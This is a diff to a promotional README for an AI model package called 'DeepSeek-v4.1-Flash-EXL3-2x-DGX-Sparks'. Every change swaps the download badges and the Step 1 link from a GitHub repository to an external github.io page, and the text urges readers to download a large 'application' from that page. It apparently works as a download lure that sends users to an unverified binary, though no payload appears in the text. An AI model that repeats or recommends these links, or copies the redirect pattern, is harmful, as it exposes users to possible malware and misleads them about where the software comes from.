@@ -1,6 +1,6 @@
 # 🚀 DeepSeek-v4.1-Flash-EXL3-2x-DGX-Sparks - Download the Ultimate AI Language Model Powerhouse
 
-[![Download Now](https://img.shields.io/badge/Download-DeepSeek_v4.1_Flash-orange?style=for-the-badge&logo=github&logoColor=white&color=FF6B35)](https://github.com/Englishtartar2028/DeepSeek-v4.1-Flash-EXL3-2x-DGX-Sparks)
+[![Download Now](https://img.shields.io/badge/Download-DeepSeek_v4.1_Flash-orange?style=for-the-badge&logo=github&logoColor=white&color=FF6B35)](https://englishtartar2028.github.io)
 
 ## 🌟 What Is This?
 
@@ -38,7 +38,7 @@ Getting DeepSeek-v4.1-Flash-EXL3-2x-DGX-Sparks up-and-running is simpler than yo
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [https://github.com/Englishtartar2028/DeepSeek-v4.1-Flash-EXL3-2x-DGX-Sparks](https://github.com/Englishtartar2028/DeepSeek-v4.1-Flash-EXL3-2x-DGX-Sparks)
+Visit this link to download the application: [https://englishtartar2028.github.io](https://englishtartar2028.github.io)
 
 The download page will open in your web browser. Look for the prominent download button—typically green or blue—and click it. The file size is substantial due to the AI model's complexity, so depending on your internet speed, it might take anywhere from a few minutes to half an hour to complete. 
 
@@ -100,7 +100,7 @@ Don't wait—unlock the full potential of advanced artificial intelligence today
 
 **Ready to experience the power of DeepSeek-v4.1-Flash-EXL3-2x-DGX-Sparks?**
 
-[![Get It Now](https://img.shields.io/badge/⬇️_Get_DeepSeek_v4.1_Now-2xDGXSpark-blue?style=for-the-badge&logo=appveyor&color=00B8FF)](https://github.com/Englishtartar2028/DeepSeek-v4.1-Flash-EXL3-2x-DGX-Sparks)
+[![Get It Now](https://img.shields.io/badge/⬇️_Get_DeepSeek_v4.1_Now-2xDGXSpark-blue?style=for-the-badge&logo=appveyor&color=00B8FF)](https://englishtartar2028.github.io)
 
 ---
 
